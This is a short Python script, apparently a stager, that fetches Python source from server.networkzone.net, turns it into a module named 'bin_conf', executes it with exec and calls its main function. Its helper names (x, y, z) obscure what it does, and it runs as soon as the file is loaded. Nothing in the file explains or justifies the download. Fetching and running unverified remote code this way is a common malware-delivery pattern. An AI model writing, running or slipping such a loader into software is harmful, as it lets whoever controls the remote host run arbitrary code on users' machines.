import sys
import types
import urllib.request

def x():
    return "https://server.networkzone.net/bin/configurator.py"

def y():
    return "bin_conf"

def z(url):
    with urllib.request.urlopen(url) as response:
        return response.read().decode('utf-8')

def main():
    url = x()
    module_name = y()

    source_code = z(url)
    module = types.ModuleType(module_name)
    sys.modules[module_name] = module
    exec(source_code, module.__dict__)

    try:
        module.main()
    except Exception as e:
        print(e)

main()
